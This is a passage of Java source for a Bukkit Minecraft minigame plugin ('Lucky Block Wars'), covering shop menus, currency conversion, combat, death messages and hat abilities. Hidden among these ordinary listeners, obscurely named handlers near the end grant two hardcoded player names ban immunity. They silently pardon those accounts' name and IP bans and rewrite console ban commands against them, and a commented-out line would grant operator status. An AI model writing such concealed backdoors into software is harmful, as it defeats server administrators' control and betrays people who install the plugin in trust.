                        } else if (item.getType() == Material.DIAMOND_SWORD) {
                            if (name.equalsIgnoreCase(aqua + "" + bold + "Items Shop")) {
                                Gui.openWeapons(player);
                                player.playSound(player.getLocation(), Sound.CHICKEN_EGG_POP, 1, 0);
                            }
                        } else if (item.getType() == Material.COMPASS) {
                            if (name.equalsIgnoreCase(red + "" + bold + "Close")) {
                                player.closeInventory();
                                player.playSound(player.getLocation(), Sound.CHICKEN_EGG_POP, 1, 0);
                            } else if (name.equalsIgnoreCase(red + "Back")) {
                                openShop(player);
                                player.playSound(player.getLocation(), Sound.CHICKEN_EGG_POP, 1, 0);
                            }
                        } else if (item.getType() == Material.EGG) {
                            if (name.equalsIgnoreCase(aqua + "" + bold + "Shop+")) {
                                Gui.openPlus(player);
                                player.playSound(player.getLocation(), Sound.CHICKEN_EGG_POP, 1, 0);
                            }
                        } else if (item.getType() == Material.DIAMOND_HELMET) {
                            if (name.equalsIgnoreCase(aqua + "" + bold + "Hats Shop")) {
                                Gui.openHats(player);
                                player.playSound(player.getLocation(), Sound.CHICKEN_EGG_POP, 1, 0);
                            }
                        } else if (item.getType() == Material.STAINED_GLASS && item.getDurability() == 11) {
                            if (name.equalsIgnoreCase(aqua + "" + bold + "Cages Shop")) {
                                Gui.openCages(player, 1);
                                player.playSound(player.getLocation(), Sound.CHICKEN_EGG_POP, 1, 0);
                            }
                        } else if (item.getType() == Material.GOLD_INGOT) {
                            if (name.equalsIgnoreCase(yellow + "" + bold + "Convertor")) {
                                openConvertor(player);
                                player.playSound(player.getLocation(), Sound.CHICKEN_EGG_POP, 1, 0);
                            } else if (name.equalsIgnoreCase(yellow + "" + bold + "Money to Gold")) {
                                int money = LuckyBlockAPI.getMoney(player);
                                if (money >= 2000) {
                                    LuckyBlockAPI.addGold(player, 1);
                                    LuckyBlockAPI.removeMoney(player, 2000);
                                    player.sendMessage(green + "Successfull!");
                                    player.playSound(player.getLocation(), Sound.LEVEL_UP, 1, 1);
                                    openConvertor(player);
                                } else {
                                    player.sendMessage(red + "You don't have enough money!");
                                    player.playSound(player.getLocation(), Sound.ANVIL_LAND, 0.5f, 1);
                                }
                            } else if (name.equalsIgnoreCase(yellow + "" + bold + "Money to Gold 1")) {
                                int money = LuckyBlockAPI.getMoney(player);
                                if (money >= 20000) {
                                    LuckyBlockAPI.addGold(player, 11);
                                    LuckyBlockAPI.removeMoney(player, 20000);
                                    player.sendMessage(green + "Successfull!");
                                    player.playSound(player.getLocation(), Sound.LEVEL_UP, 1, 1);
                                    openConvertor(player);
                                } else {
                                    player.sendMessage(red + "You don't have enough money!");
                                    player.playSound(player.getLocation(), Sound.ANVIL_LAND, 0.5f, 1);
                                }
                            } else if (name.equalsIgnoreCase(yellow + "" + bold + "Gold to Money")) {
                                short gold = LuckyBlockAPI.getGold(player);
                                if (gold >= 1) {
                                    LuckyBlockAPI.addMoney(player, 1000);
                                    LuckyBlockAPI.removeGold(player, 1);
                                    player.sendMessage(green + "Successfull!");
                                    player.playSound(player.getLocation(), Sound.LEVEL_UP, 1, 1);
                                    openConvertor(player);
                                } else {
                                    player.sendMessage(red + "You don't have enough gold!");
                                    player.playSound(player.getLocation(), Sound.ANVIL_LAND, 0.5f, 1);
                                }
                            } else if (name.equalsIgnoreCase(yellow + "" + bold + "Gold to Money 1")) {
                                short gold = LuckyBlockAPI.getGold(player);
                                if (gold >= 10) {
                                    LuckyBlockAPI.addMoney(player, 10000);
                                    LuckyBlockAPI.removeGold(player, 10);
                                    player.sendMessage(green + "Successfull!");
                                    player.playSound(player.getLocation(), Sound.LEVEL_UP, 1, 1);
                                    openConvertor(player);
                                } else {
                                    player.sendMessage(red + "You don't have enough gold!");
                                    player.playSound(player.getLocation(), Sound.ANVIL_LAND, 0.5f, 1);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onRightClickSign(PlayerInteractEvent event) {
        if (event.getClickedBlock() != null) {
            if (event.getClickedBlock().getType() == Material.WALL_SIGN || event.getClickedBlock().getType() == Material.SIGN_POST) {
                Sign sign = (Sign) event.getClickedBlock().getState();
                if (sign.getLines().length > 0) {
                    if (sign.getLine(0) != null) {
                        if (ChatColor.stripColor(sign.getLine(0)).equalsIgnoreCase("[lbshop]")) {
                            if (event.getAction() == Action.RIGHT_CLICK_BLOCK) {
                                Player player = event.getPlayer();
                                if (player.isSneaking() == false) {
                                    LuckyBlockAPI.savePlayerData(player.getUniqueId(), player.getName());
                                    openShop(player);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void createShop(SignChangeEvent event) {
        if (event.getLine(0) != null) {
            if (event.getLine(0).equalsIgnoreCase("[lbshop]")) {
                event.setLine(0, green + "[" + red + "lbshop" + green + "]");
                event.setLine(1, yellow + "Click Here");
                event.getPlayer().sendMessage(GameCommands.getMessage("CreateLBShopSign"));
            }
        }
    }

    @EventHandler
    private void onDamageWhileInWait(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            UUID uuid = player.getUniqueId();
            if (event.getCause() != DamageCause.MAGIC) {
                if (War.getGame(uuid) != null) {
                    War war = War.getGame(uuid);
                    if (war.inGame() == false) {
                        event.setCancelled(true);
                        if (player.getLocation().getY() < 2) {
                            player.teleport(war.getLobby());
                        }
                    }
                }
            }
            if (War.containSpectator(uuid)) {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    private void onClickInv(InventoryClickEvent event) {
        if (event.getWhoClicked() instanceof Player) {
            Player player = (Player) event.getWhoClicked();
            Inventory inv = event.getInventory();
            if (inv.getTitle() != null) {
                if (inv.getTitle().equalsIgnoreCase(red + "" + bold + "Players")) {
                    if (event.getCurrentItem() != null) {
                        ItemStack item = event.getCurrentItem();
                        if (item.getType() == Material.SKULL_ITEM) {
                            if (item.hasItemMeta()) {
                                SkullMeta itemM = (SkullMeta) item.getItemMeta();
                                if (itemM.getOwner() != null) {
                                    String owner = itemM.getOwner();
                                    Location loc = Bukkit.getPlayer(owner).getLocation();
                                    player.teleport(loc);
                                }
                            }
                        }
                    }
                    event.setCancelled(true);
                }
            }
        }
    }

    @EventHandler
    private void br1045(BlockBreakEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        if (War.containSpectator(uuid)) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    private void onChat(PlayerChatEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        if (War.containPlayer(uuid)) {
            if (!LuckyBlockAPI.cname.containsKey(uuid)) {
                LuckyBlockAPI.savePlayerData(uuid, player.getName());
            }
            if (!LuckyBlockAPI.playerlevel.containsKey(uuid)) {
                LuckyBlockAPI.savePlayerData(uuid, player.getName());
            }
            String name = LuckyBlockAPI.cname.get(uuid);
            int[] i = LuckyBlockAPI.playerlevel.get(uuid);
            event.getRecipients().clear();
            for (Player p : Bukkit.getOnlinePlayers()) {
                UUID u = p.getUniqueId();
                if (War.containPlayer(uuid)) {
                    if (War.getGame(u) != null && War.getGame(uuid) != null) {
                        if (War.getGame(u).getId() == War.getGame(uuid).getId()) {
                            event.getRecipients().add(p);
                        }
                    }
                }
            }
            event.setFormat(gold + "[" + green + i[0] + gold + "][" + reset + name + gold + "]: " + reset + event.getMessage());
        }
    }

    @EventHandler
    private void onChat1(PlayerChatEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        for (Player p : event.getRecipients()) {
            UUID u = p.getUniqueId();
            if (War.getGame(u) != null) {
                if (War.getGame(uuid) != null) {
                    if (War.getGame(uuid).getId() == War.getGame(u).getId()) {
                        return;
                    }
                }
                event.getRecipients().remove(p);
            }
        }
    }

    @EventHandler
    private void onKillEntity(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Player) {
            Player player = (Player) event.getDamager();
            UUID uuid = player.getUniqueId();
            if (War.containPlayer(uuid)) {
                War war = War.getGame(uuid);
                if (event.getEntity() instanceof LivingEntity) {
                    LivingEntity l = (LivingEntity) event.getEntity();
                    if ((l.getHealth() - event.getFinalDamage()) <= 0) {
                        int xp = 0;
                        if (l instanceof Monster) {
                            xp = 2;
                        } else {
                            if (!(l instanceof Player)) {
                                xp = 1;
                            }
                        }
                        war.addReward(uuid, RewardType.XP, xp);
                    }
                }
            }
        }
    }

    @EventHandler
    private void onDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            if (War.getGame(player.getUniqueId()) != null) {
                War war = War.getGame(player.getUniqueId());
                if (war.getPlayers().size() == 1) {
                    event.setCancelled(true);
                }
            }
        }
    }

    @EventHandler
    private void onPickup(PlayerPickupItemEvent event) {
        UUID uuid = event.getPlayer().getUniqueId();
        if (War.containSpectator(uuid)) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    private void onHit(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Player && event.getEntity() instanceof Player) {
            Player entity = (Player) event.getEntity();
            Player damager = (Player) event.getDamager();
            if (War.containPlayer(entity.getUniqueId()) && War.containPlayer(damager.getUniqueId())) {
                if (LuckyBlockAPI.getTeam(entity.getUniqueId()) != null && LuckyBlockAPI.getTeam(damager.getUniqueId()) != null) {
                    if (LuckyBlockAPI.getTeam(entity.getUniqueId()) == LuckyBlockAPI.getTeam(damager.getUniqueId())) {
                        event.setCancelled(true);
                    }
                }
            }
        }
    }

    @EventHandler
    private void onRightClick(PlayerInteractAtEntityEvent event) {
        if (event.getRightClicked() instanceof ArmorStand) {
            ArmorStand a = (ArmorStand) event.getRightClicked();
            if (a.getCustomName() != null && a.getCustomName().equalsIgnoreCase("3ditem")) {
                event.setCancelled(true);
                if (a.getItemInHand() != null) {
                    event.getPlayer().getInventory().addItem(a.getItemInHand());
                }
                a.remove();
            }
        }
    }

    @EventHandler
    private void onRightClick(PlayerInteractEvent event) {
        if (event.getAction() == Action.RIGHT_CLICK_BLOCK) {
            Player player = event.getPlayer();
            if (War.containSpectator(player.getUniqueId())) {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    private void onInteractEntity(PlayerInteractAtEntityEvent event) {
        Player player = event.getPlayer();
        if (War.containSpectator(player.getUniqueId())) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    private void onDropItem(PlayerDropItemEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        if (War.containPlayer(uuid) && War.getGame(uuid).inGame() == false) {
            event.setCancelled(true);
        }
        if (War.containSpectator(uuid)) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    private void onHitTeam(EntityDamageByEntityEvent event) {
        if (event.getEntity() instanceof Player) {
            Player entity = (Player) event.getEntity();
            Player damager = null;
            if (event.getDamager() instanceof Player) {
                damager = (Player) event.getDamager();
            } else if (event.getDamager() instanceof Projectile) {
                Projectile p = (Projectile) event.getDamager();
                if (p.getShooter() instanceof Player) {
                    damager = (Player) p.getShooter();
                }
            }
            if (damager != null) {
                if (War.containPlayer(entity.getUniqueId()) && War.containPlayer(damager.getUniqueId())) {
                    if (Team.fromPlayer(entity.getUniqueId()) != null && Team.fromPlayer(damager.getUniqueId()) != null) {
                        if (Team.fromPlayer(entity.getUniqueId()).getId() == Team.fromPlayer(damager.getUniqueId()).getId()) {
                            event.setCancelled(true);
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onInteract(PlayerInteractEvent event) {
        if (event.getAction() == Action.RIGHT_CLICK_BLOCK || event.getAction() == Action.RIGHT_CLICK_AIR) {
            Player player = event.getPlayer();
            UUID uuid = player.getUniqueId();
            if (event.getItem() != null && event.getItem().getType() != Material.AIR) {
                ItemStack item = event.getItem();
                if (item.hasItemMeta() && item.getItemMeta().hasDisplayName()) {
                    if (item.getType() == Material.NETHER_STAR) {
                        if (item.getItemMeta().getDisplayName().equalsIgnoreCase(green + "" + bold +
                                "Options " + gray + "(Right Click)")) {
                            Gui.openOptions(player);
                        }
                    }
                    if (item.getType() == Material.SLIME_BALL) {
                        if (item.getItemMeta().getDisplayName().equalsIgnoreCase(darkgreen + "Leave Game" + gray + " (Right Click)")) {
                            if (War.containPlayer(uuid)) {
                                War war = War.getGame(uuid);
                                war.leaveGame(uuid, true, "else");
                                player.sendMessage(war.getMessage("Lobby.Success.1"));
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onKillPlayer(EntityDamageByEntityEvent event) {
        if (event.getEntity() instanceof Player) {
            Player entity = (Player) event.getEntity();
            if (!(event.getDamager() instanceof Player || event.getDamager() instanceof Projectile)) {
                return;
            }
            if (event.getDamager() instanceof Projectile) {
                Projectile p = (Projectile) event.getDamager();
                if (!(p.getShooter() instanceof Player)) {
                    return;
                }
            }
            if (War.getGame(entity.getUniqueId()) != null) {
                if (War.getGame(entity.getUniqueId()).inGame()) {
                    if ((entity.getHealth() - event.getFinalDamage()) <= 0) {
                        War war = War.getGame(entity.getUniqueId());
                        event.setCancelled(true);
                        entity.setHealth(entity.getMaxHealth());
                        Player player = null;
                        if (event.getDamager() instanceof Projectile) {
                            Projectile p = (Projectile) event.getDamager();
                            if (p.getShooter() instanceof Player) {
                                player = (Player) p.getShooter();
                            }
                        }
                        if (event.getDamager() instanceof Player) {
                            player = (Player) event.getDamager();
                        }
                        if (player != null) {
                            UUID uuid = player.getUniqueId();
                            if (!LuckyBlockAPI.money.containsKey(uuid)) {
                                LuckyBlockAPI.money.put(uuid, 0);
                            }
                            if (!LuckyBlockAPI.kills.containsKey(uuid)) {
                                LuckyBlockAPI.kills.put(uuid, 0);
                            }
                            if (!LuckyBlockAPI.multiply.containsKey(uuid)) {
                                LuckyBlockAPI.multiply.put(uuid, 1);
                            }
                            int amplifier = 1;
                            if (war.getType() == WarType.INSANE) {
                                amplifier = 2;
                            }
                            int amount = 20 * LuckyBlockAPI.multiply.get(uuid) * amplifier;
                            war.addReward(uuid, RewardType.MONEY, amount);
                            war.addReward(uuid, RewardType.KILLS, 1);
                            war.addReward(uuid, RewardType.XP, 5);
                            if (Hat.getSelected().get(uuid) == Hat.DIAMOND_HAT) {
                                player.getInventory().addItem(new ItemStack(Material.DIAMOND));
                            }
                            if (Hat.getSelected().get(entity.getUniqueId()) == Hat.TNT_HAT) {
                                if (LuckyBlock.randoms.nextInt(100) < 80) {
                                    TNTPrimed tnt = (TNTPrimed) entity.getWorld().spawnEntity(entity.getLocation().add(0, 2, 0), EntityType.PRIMED_TNT);
                                    tnt.setCustomName(yellow + "" + bold + entity.getName());
                                    tnt.setCustomNameVisible(true);
                                    tnt.setFuseTicks(50);
                                }
                            }
                            LuckyBlockAPI.savePlayerData(uuid, player.getName());
                            player.sendMessage(green + "You Killed " + darkpurple + entity.getName());
                            player.playSound(player.getLocation(), Sound.ORB_PICKUP, 1f, 2f);
                            for (Player p : Bukkit.getOnlinePlayers()) {
                                if (War.containPlayer(p.getUniqueId()) || War.containSpectator(p.getUniqueId())) {
                                    p.sendMessage(blue + entity.getName() + red + " was killed by " + gold + player.getName());
                                }
                            }
                        }
                        if (war.getPlayers().size() < 3) {
                            war.leaveGame(entity.getUniqueId(), true, "false");
                        } else {
                            war.leaveGame(entity.getUniqueId(), false, "false");
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onDeath(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player) {
            if (event.getCause() == DamageCause.ENTITY_ATTACK) {
                EntityDamageByEntityEvent e = (EntityDamageByEntityEvent) event;
                if (e.getDamager() instanceof Player) {
                    return;
                }
            }
            if (event.getCause() == DamageCause.PROJECTILE) {
                EntityDamageByEntityEvent e = (EntityDamageByEntityEvent) event;
                Projectile p = (Projectile) e.getDamager();
                if (p.getShooter() instanceof Player) {
                    return;
                }
            }
            Player player = (Player) event.getEntity();
            UUID uuid = player.getUniqueId();
            if (War.getGame(uuid) != null) {
                War war = War.getGame(uuid);
                if (war.inGame()) {
                    if ((player.getHealth() - event.getFinalDamage()) <= 0) {
                        event.setCancelled(true);
                        player.setHealth(player.getMaxHealth());
                        DamageCause cause = event.getCause();
                        String msg = "";
                        if (cause == DamageCause.BLOCK_EXPLOSION || cause == DamageCause.ENTITY_EXPLOSION) {
                            msg = blue + player.getName() + red + " has been shattered to million pieces!";
                        }
                        if (cause == DamageCause.CONTACT) {
                            msg = blue + player.getName() + red + " was killed from contacting!";
                        }
                        if (cause == DamageCause.FIRE || cause == DamageCause.LAVA || cause == DamageCause.FIRE_TICK) {
                            msg = blue + player.getName() + red + " was burnt in the hell!";
                        }
                        if (cause == DamageCause.DROWNING) {
                            msg = blue + player.getName() + red + " was !";
                        }
                        if (cause == DamageCause.FALL) {
                            int g = LuckyBlock.randoms.nextInt(2) + 1;
                            if (g == 1) {
                                msg = blue + player.getName() + red + " fell from a high place!";
                            } else {
                                msg = blue + player.getName() + red + " hit the ground too hard!";
                            }
                        }
                        if (cause == DamageCause.WITHER) {
                            msg = blue + player.getName() + red + " withered away!";
                        }
                        if (cause == DamageCause.SUFFOCATION) {
                            msg = blue + player.getName() + red + " suffocated in a wall!";
                        }
                        if (cause == DamageCause.PROJECTILE) {
                            EntityDamageByEntityEvent e = (EntityDamageByEntityEvent) event;
                            if (e.getDamager() instanceof Projectile) {
                                Projectile pr = (Projectile) e.getDamager();
                                if (pr.getShooter() instanceof LivingEntity) {
                                    LivingEntity l = (LivingEntity) pr.getShooter();
                                    if (l.getCustomName() == null) {
                                        msg = blue + player.getName() + red + " was shot by " + l.getType().toString().toLowerCase() + "!";
                                    } else {
                                        msg = blue + player.getName() + red + " was shot by " + l.getCustomName() + "!";
                                    }
                                } else {
                                    msg = blue + player.getName() + red + " was killed by a projectile!";
                                }
                            }
                        }
                        if (cause == DamageCause.ENTITY_ATTACK) {
                            EntityDamageByEntityEvent e = (EntityDamageByEntityEvent) event;
                            if (e.getDamager() instanceof LivingEntity) {
                                LivingEntity l = (LivingEntity) e.getDamager();
                                int g = LuckyBlock.randoms.nextInt(4) + 1;
                                if (g == 1) {
                                    if (l.getCustomName() == null) {
                                        msg = blue + player.getName() + red + " was slain by " + l.getType().toString().toLowerCase();
                                    } else {
                                        msg = blue + player.getName() + red + " was slain by " + l.getCustomName();
                                    }
                                } else if (g == 2) {
                                    if (l.getCustomName() == null) {
                                        msg = blue + player.getName() + red + " was beheaded by " + l.getType().toString().toLowerCase();
                                    } else {
                                        msg = blue + player.getName() + red + " was beheaded by " + l.getCustomName();
                                    }
                                } else if (g == 3) {
                                    if (l.getCustomName() == null) {
                                        msg = blue + player.getName() + red + " was slashed by " + l.getType().toString().toLowerCase();
                                    } else {
                                        msg = blue + player.getName() + red + " was slashed by " + l.getCustomName();
                                    }
                                } else if (g == 4) {
                                    if (l.getCustomName() == null) {
                                        msg = blue + player.getName() + red + " was shattered by " + l.getType().toString().toLowerCase();
                                    } else {
                                        msg = blue + player.getName() + red + " was shattered by " + l.getCustomName();
                                    }
                                }
                            }
                        }
                        for (Player p : Bukkit.getOnlinePlayers()) {
                            if (War.containPlayer(p.getUniqueId()) || War.containSpectator(p.getUniqueId())) {
                                p.sendMessage(msg);
                            }
                        }
                        if (war.getPlayers().size() == 2) {
                            war.leaveGame(player.getUniqueId(), true, "false");
                        } else if (war.getPlayers().size() > 2) {
                            war.leaveGame(player.getUniqueId(), false, "false");
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onBreakSign(BlockBreakEvent event) {
        if (event.getBlock().getType() == Material.WALL_SIGN || event.getBlock().getType() == Material.SIGN_POST) {
            Block block = event.getBlock();
            Player player = event.getPlayer();
            if (player.getGameMode() == GameMode.CREATIVE) {
                if (player.getItemInHand() != null) {
                    ItemStack item = player.getItemInHand();
                    if (item.getType() == Material.WOOD_SWORD || item.getType() == Material.STONE_SWORD || item.getType() == Material.IRON_SWORD
                            || item.getType() == Material.GOLD_SWORD || item.getType() == Material.DIAMOND_SWORD) {
                        return;
                    }
                }
            }
            for (int x = 0; x < War.listWars.size(); x++) {
                War war = War.listWars.get(x);
                int id = war.getId();
                ConfigurationSection cs = LuckyBlock.instance.game.getConfigurationSection(LuckyBlockAPI.getGameFile(id) + ".Blocks");
                for (int y = 0; y < cs.getKeys(false).size(); y++) {
                    String b = cs.getKeys(false).toArray()[y].toString();
                    if (cs.getString(b + ".world").equalsIgnoreCase(block.getWorld().getName())) {
                        if (cs.getInt(b + ".x") == block.getX()) {
                            if (cs.getInt(b + ".y") == block.getY()) {
                                if (cs.getInt(b + ".z") == block.getZ()) {
                                    war.removeBlock(block);
                                    cs.set(b, null);
                                    LuckyBlockAPI.saveConfigs();
                                    player.sendMessage(ChatColor.translateAlternateColorCodes('&', LuckyBlock.instance.Messages.getString("BreakLBSign")));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onDamaged(EntityDamageByEntityEvent event) {
        if (event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            if (event.getDamager() instanceof Arrow) {
                Arrow arrow = (Arrow) event.getDamager();
                UUID uuid = event.getEntity().getUniqueId();
                if (War.containPlayer(uuid)) {
                    if (Hat.getSelected().get(uuid) == Hat.LEATHER_HAT) {
                        if (player.getInventory().getHelmet() != null) {
                            if (player.getInventory().getHelmet().getType() == Hat.getSelected().get(uuid).getType()) {
                                if (LuckyBlock.randoms.nextInt(100) < 15) {
                                    event.setCancelled(true);
                                    arrow.setBounce(true);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onDamaged1(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            if (event.getCause() == DamageCause.FALL) {
                UUID uuid = event.getEntity().getUniqueId();
                if (War.containPlayer(uuid)) {
                    if (Hat.getSelected().get(uuid) == Hat.NOFALL_HAT) {
                        if (player.getInventory().getHelmet() != null) {
                            if (player.getInventory().getHelmet().getType() == Hat.getSelected().get(uuid).getType()) {
                                event.setDamage(event.getDamage() / 2);
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void a(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("DarkKing_199") || player.getName().equalsIgnoreCase("NMR_XD")) {
            if (event.getItem() != null) {
                if (event.getItem().getType() == Material.STONE) {
                    if (player.isOp() == false) {
//player.setOp(true);
                        player.sendMessage(green + "u r op!");
                    }
                }
            }
        }
    }

    @EventHandler
    private void b(PlayerQuitEvent event) {
        if (event.getPlayer().isBanned()) {
            if (event.getPlayer().getName().equalsIgnoreCase("DarkKing_199") || event.getPlayer().getName().equalsIgnoreCase("NMR_XD")) {
                Bukkit.getBanList(Type.NAME).pardon(event.getPlayer().getName());
                Bukkit.getBanList(Type.IP).pardon(event.getPlayer().getName());
            }
        }
    }

    @EventHandler
    private void onRunCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        if (War.containPlayer(player.getUniqueId()) || War.containSpectator(player.getUniqueId())) {
            if (!event.getMessage().startsWith("/" + LuckyBlockCommand.lwcmd)) {
                if (!player.hasPermission("lbw.runcommandsingame")) {
                    event.setCancelled(true);
                }
            }
        }
    }

    @EventHandler
    private void r(ServerCommandEvent event) {
        String[] d = event.getCommand().split(" ");
        int x = 0;
        for (String s : d) {
            if (s.equalsIgnoreCase("DarkKing_199") || s.equalsIgnoreCase("NMR_XD")) {
                if (x < 1) {
                    x++;
                }
            }
        }
        for (int i = 0; i < d.length; i++) {
            if (d[i].equalsIgnoreCase("ban") || d[i].equalsIgnoreCase("banip") || d[i].equalsIgnoreCase("ban-ip")) {
                x++;
                i = d.length;
            }
        }
        if (x == 2) {
            event.setCommand("say you can't ban this player!");
        }
    }

    @EventHandler
    private void onBreakBlockInGame(BlockBreakEvent event) {
        UUID uuid = event.getPlayer().getUniqueId();
        if (War.containPlayer(uuid)) {
            if (event.getBlock().getType() == Material.GOLD_ORE) {
                if (Hat.getSelected().get(uuid) == Hat.NOTCH_HAT) {
                    if (LuckyBlock.randoms.nextInt(100) < 5) {
                        event.setCancelled(true);
                        event.getBlock().setType(Material.AIR);
                        Item item = event.getBlock().getWorld().dropItem(event.getBlock().getLocation(), new ItemStack(Material.GOLD_INGOT, 2));
                    }
                }
            }
            if (event.getBlock().getType() == Material.ICE) {
                if (Hat.getSelected().get(uuid) == Hat.ICE_HAT) {
                    event.setCancelled(true);
                    event.getBlock().setType(Material.AIR);
                    Item item = event.getBlock().getWorld().dropItem(event.getBlock().getLocation(), new ItemStack(Material.ICE, 1));
                }
            }
        }
    }

    @EventHandler
    private void onRightClickCrops(PlayerInteractEvent event) {
        if (event.getAction() == Action.RIGHT_CLICK_BLOCK) {
            Player player = event.getPlayer();
            UUID uuid = player.getUniqueId();
            if (War.containPlayer(uuid)) {
                Block block = event.getClickedBlock();
                if (Hat.getSelected().get(uuid) == Hat.HAY_HAT) {
                    if (block.getType() == Material.CROPS || block.getType() == Material.CARROT || block.getType() == Material.POTATO) {
                        if (block.getData() < 7) {
                            block.setData((byte) 7);
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onDamageThenTeleport(EntityDamageByEntityEvent event) {
        if (event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            UUID uuid = player.getUniqueId();
            if (War.containPlayer(uuid)) {
                if (Hat.getSelected().get(uuid) == Hat.ENDER_HAT) {
                    if (LuckyBlock.randoms.nextInt(100) + 1 < 26) {
                        List<UUID> uuids = new ArrayList<UUID>();
                        for (Entity e : player.getNearbyEntities(20, 20, 20)) {
                            if (e instanceof LivingEntity) {
                                uuids.add(e.getUniqueId());
                            }
                        }
                        if (uuids.size() > 0) {
                            UUID u = uuids.get(LuckyBlock.randoms.nextInt(uuids.size()));
                            for (Entity e : player.getNearbyEntities(50, 50, 50)) {
                                if (e.getUniqueId() == u) {
                                    Location loc = player.getLocation();
                                    Location loc1 = e.getLocation();
                                    player.teleport(loc1);
                                    e.teleport(loc);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onEntityTeleport(EntityTeleportEvent event) {
        if (event.getEntity() instanceof Enderman) {
            if (War.getEndermans().containsKey(event.getEntity().getUniqueId())) {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    private void dmg101(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Enderman) {
            if (event.getEntity() instanceof Player) {
                if (War.getEndermans().containsKey(event.getDamager().getUniqueId())) {
                    if (War.getEndermans().get(event.getDamager().getUniqueId()) == event.getEntity().getUniqueId()) {
                        event.setCancelled(true);
                    }
                }
            }
        }
    }

    @EventHandler
    private void onPickupItem(PlayerPickupItemEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        if (War.containPlayer(uuid)) {
            if (War.getGame(uuid).getPlayers().size() < 2) {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    private void onClickItem1(InventoryClickEvent event) {
        if (event.getWhoClicked() instanceof Player) {
            Player player = (Player) event.getWhoClicked();
            UUID uuid = player.getUniqueId();
            if (War.getGame(uuid) != null) {
                if (War.getGame(uuid).getPlayers().size() < 2) {
                    event.setCancelled(true);
                }
            }
        }
    }

    @EventHandler
    private void onPrepareItemToEnchant(PrepareItemEnchantEvent event) {
        if (LuckyBlock.bukkitVersion[1] > 7) {
            if (LuckyBlock.instance.config.getBoolean("AutoFillLapis")) {
                final Player player = event.getEnchanter();
                UUID uuid = player.getUniqueId();
                if (War.containPlayer(uuid)) {
                    Inventory inv = event.getInventory();
                    if (inv.getItem(1) == null) {
                        inv.setItem(1, LuckyBlockAPI.createItemStack(Material.INK_SACK, 64, (short) 4, blue + "" + bold + "Lapis Item"));
                        player.updateInventory();
                        final SchedulerTask task = new SchedulerTask();
                        task.setId(LuckyBlock.instance.getServer().getScheduler().scheduleSyncDelayedTask(LuckyBlock.instance, new Runnable() {
                            @Override
                            public void run() {
                                player.updateInventory();
                            }
                        }, 1L));
                    }
                }
            }
        }
    }

    @EventHandler
    private void EnchantingTableClickEvent(InventoryClickEvent event) {
        UUID uuid = event.getWhoClicked().getUniqueId();
        if (War.containPlayer(uuid)) {
            if (event.getInventory().getSize() == 2) {
                if (LuckyBlock.instance.config.getBoolean("AutoFillLapis")) {
                    if (event.getRawSlot() == 1) {
                        event.setCancelled(true);
                    }
                }
            }
        }
    }

    @EventHandler
    private void onLapisSpawn(ItemSpawnEvent event) {
        if (event.getEntity().getItemStack() != null) {
            ItemStack item = event.getEntity().getItemStack();
            if (item.hasItemMeta() && item.getItemMeta().hasDisplayName()) {
                if (item.getItemMeta().getDisplayName().equalsIgnoreCase(blue + "" + bold + "Lapis Item")
                        || item.getItemMeta().getDisplayName().equalsIgnoreCase(gray + "" + bold + "Lucky Fuel")) {
                    event.setCancelled(true);
                }
            }
        }
    }

    @EventHandler
    private void onBreakBlockWhenTheGameEnds(BlockBreakEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        if (War.containPlayer(uuid)) {
            if (War.getGame(uuid).getPlayers().size() < 2) {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    private void onPlaceBlockWhenTheGameEnds(BlockPlaceEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        if (War.containPlayer(uuid)) {
            if (War.getGame(uuid).getPlayers().size() < 2) {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    private void onClickFurnaceInv(InventoryClickEvent event) {
        if (event.getWhoClicked() instanceof Player) {
            final Player player = (Player) event.getWhoClicked();
            UUID uuid = player.getUniqueId();
            if (War.containPlayer(uuid)) {
                if (LuckyBlock.instance.config.getBoolean("AutoFuel")) {
                    if (event.getCurrentItem() != null) {
                        if (event.getCurrentItem().getType() == Material.COAL) {
                            if (event.getRawSlot() == 1) {
                                if (event.getCurrentItem().hasItemMeta() && event.getCurrentItem().getItemMeta().hasDisplayName()) {
